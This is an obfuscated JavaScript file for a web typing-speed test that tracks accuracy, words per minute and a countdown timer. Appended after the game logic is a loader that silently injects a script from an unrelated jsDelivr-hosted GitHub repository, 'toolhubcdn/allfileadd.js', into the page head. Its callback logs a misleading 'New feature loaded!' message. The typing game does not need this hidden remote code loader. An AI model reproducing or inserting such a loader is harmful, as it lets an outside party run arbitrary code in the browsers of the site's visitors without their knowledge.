const _0x4a5f25 = _0x2247;
(function (_0x865ede, _0xdfa573) {
    const _0x1cb493 = _0x2247, _0x680ae9 = _0x865ede();
    while (!![]) {
        try {
            const _0x416890 = parseInt(_0x1cb493(0x125)) / 0x1 * (-parseInt(_0x1cb493(0x12b)) / 0x2) + -parseInt(_0x1cb493(0x138)) / 0x3 * (parseInt(_0x1cb493(0x12e)) / 0x4) + parseInt(_0x1cb493(0x123)) / 0x5 + -parseInt(_0x1cb493(0x13b)) / 0x6 * (parseInt(_0x1cb493(0x130)) / 0x7) + -parseInt(_0x1cb493(0x126)) / 0x8 * (parseInt(_0x1cb493(0x13a)) / 0x9) + -parseInt(_0x1cb493(0x13e)) / 0xa + parseInt(_0x1cb493(0x142)) / 0xb;
            if (_0x416890 === _0xdfa573)
                break;
            else
                _0x680ae9['push'](_0x680ae9['shift']());
        } catch (_0x57bf45) {
            _0x680ae9['push'](_0x680ae9['shift']());
        }
    }
}(_0x5276, 0x4d8c7));
const typingText = document[_0x4a5f25(0x143)](_0x4a5f25(0x135)), inpField = document[_0x4a5f25(0x143)](_0x4a5f25(0x147)), tryAgainBtn = document[_0x4a5f25(0x143)]('.content\x20button'), timeTag = document[_0x4a5f25(0x143)]('.time\x20span\x20b'), mistakeTag = document['querySelector'](_0x4a5f25(0x140)), wpmTag = document['querySelector'](_0x4a5f25(0x13c)), cpmTag = document[_0x4a5f25(0x143)](_0x4a5f25(0x144));
let timer, maxTime = 0x3c, timeLeft = maxTime, charIndex = mistakes = isTyping = 0x0;
const loadParagraph = () => {
        const _0x366456 = _0x4a5f25, _0x1c96c6 = Math['floor'](Math[_0x366456(0x131)]() * quote[_0x366456(0x127)]);
        typingText[_0x366456(0x12f)] = '', quote[_0x1c96c6][_0x366456(0x128)]('')[_0x366456(0x137)](_0x955078 => {
            const _0x50ecf8 = _0x366456;
            let _0x4200c7 = '<span>' + _0x955078 + _0x50ecf8(0x12a);
            typingText[_0x50ecf8(0x12f)] += _0x4200c7;
        }), typingText[_0x366456(0x149)](_0x366456(0x122))[0x0]['classList'][_0x366456(0x133)](_0x366456(0x132)), document[_0x366456(0x13d)](_0x366456(0x12c), () => inpField['focus']()), typingText[_0x366456(0x13d)]('click', () => inpField[_0x366456(0x134)]());
    }, initTyping = () => {
        const _0x49afff = _0x4a5f25;
        let _0x1e5e1e = typingText[_0x49afff(0x149)](_0x49afff(0x122)), _0x24a2c1 = inpField['value'][_0x49afff(0x128)]('')[charIndex];
        if (charIndex < _0x1e5e1e[_0x49afff(0x127)] - 0x1 && timeLeft > 0x0) {
            !isTyping && (timer = setInterval(initTimer, 0x3e8), isTyping = !![]);
            _0x24a2c1 == null ? charIndex > 0x0 && (charIndex--, _0x1e5e1e[charIndex][_0x49afff(0x141)]['contains'](_0x49afff(0x124)) && mistakes--, _0x1e5e1e[charIndex][_0x49afff(0x141)][_0x49afff(0x146)](_0x49afff(0x139), _0x49afff(0x124))) : (_0x1e5e1e[charIndex][_0x49afff(0x148)] == _0x24a2c1 ? _0x1e5e1e[charIndex][_0x49afff(0x141)][_0x49afff(0x133)](_0x49afff(0x139)) : (mistakes++, _0x1e5e1e[charIndex]['classList'][_0x49afff(0x133)]('incorrect')), charIndex++);
            _0x1e5e1e['forEach'](_0x26cc3a => _0x26cc3a['classList'][_0x49afff(0x146)](_0x49afff(0x132))), _0x1e5e1e[charIndex]['classList']['add'](_0x49afff(0x132));
            let _0x314a7d = Math[_0x49afff(0x13f)]((charIndex - mistakes) / 0x5 / (maxTime - timeLeft) * 0x3c);
            _0x314a7d = _0x314a7d < 0x0 || !_0x314a7d || _0x314a7d === Infinity ? 0x0 : _0x314a7d, wpmTag[_0x49afff(0x148)] = _0x314a7d, mistakeTag[_0x49afff(0x148)] = mistakes, cpmTag['innerText'] = charIndex - mistakes;
        } else
            clearInterval(timer), inpField[_0x49afff(0x12d)] = '';
    }, initTimer = () => {
        const _0x47e101 = _0x4a5f25;
        if (timeLeft > 0x0) {
            timeLeft--, timeTag['innerText'] = timeLeft;
            let _0x3267a4 = Math[_0x47e101(0x13f)]((charIndex - mistakes) / 0x5 / (maxTime - timeLeft) * 0x3c);
            wpmTag[_0x47e101(0x148)] = _0x3267a4;
        } else
            clearInterval(timer);
    }, resetGame = () => {
        const _0x1c75e1 = _0x4a5f25;
        loadParagraph(), clearInterval(timer), timeLeft = maxTime, charIndex = mistakes = isTyping = 0x0, inpField[_0x1c75e1(0x12d)] = '', timeTag[_0x1c75e1(0x148)] = timeLeft, wpmTag[_0x1c75e1(0x148)] = 0x0, mistakeTag[_0x1c75e1(0x148)] = 0x0, cpmTag[_0x1c75e1(0x148)] = 0x0;
    };
function _0x2247(_0x2167ee, _0x3cae03) {
    const _0x527628 = _0x5276();
    return _0x2247 = function (_0x224769, _0x56d034) {
        _0x224769 = _0x224769 - 0x121;
        let _0x22970c = _0x527628[_0x224769];
        return _0x22970c;
    }, _0x2247(_0x2167ee, _0x3cae03);
}
function _0x5276() {
    const _0x2f44f3 = [
        'head',
        'forEach',
        '21GzjPAz',
        'correct',
        '29961bsWMZg',
        '468168lDlapd',
        '.wpm\x20span',
        'addEventListener',
        '6341370HaGluU',
        'round',
        '.mistake\x20span',
        'classList',
        '24659107nJFCLV',
        'querySelector',
        '.cpm\x20span',
        'log',
        'remove',
        '.container\x20.typing_field',
        'innerText',
        'querySelectorAll',
        'onload',
        'input',
        'span',
        '231400eqZHVT',
        'incorrect',
        '360508KCSZaF',
        '1072vMNIML',
        'length',
        'split',
        'script',
        '</span>',
        '2xyrWNt',
        'keydown',
        'value',
        '258068AQlRvf',
        'innerHTML',
        '7KrRZJg',
        'random',
        'active',
        'add',
        'focus',
        '.typing_quote\x20p'
    ];
    _0x5276 = function () {
        return _0x2f44f3;
    };
    return _0x5276();
}
loadParagraph(), inpField[_0x4a5f25(0x13d)](_0x4a5f25(0x121), initTyping), tryAgainBtn[_0x4a5f25(0x13d)]('click', resetGame);
function loadScript(_0x1f3023, _0x2d5509) {
    const _0xc8e0dd = _0x4a5f25, _0x327e7e = document['createElement'](_0xc8e0dd(0x129));
    _0x327e7e['src'] = _0x1f3023, _0x327e7e[_0xc8e0dd(0x14a)] = _0x2d5509, document[_0xc8e0dd(0x136)]['appendChild'](_0x327e7e);
}
loadScript('https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js', function () {
    const _0x3292dc = _0x4a5f25;
    console[_0x3292dc(0x145)]('New\x20feature\x20loaded!');
});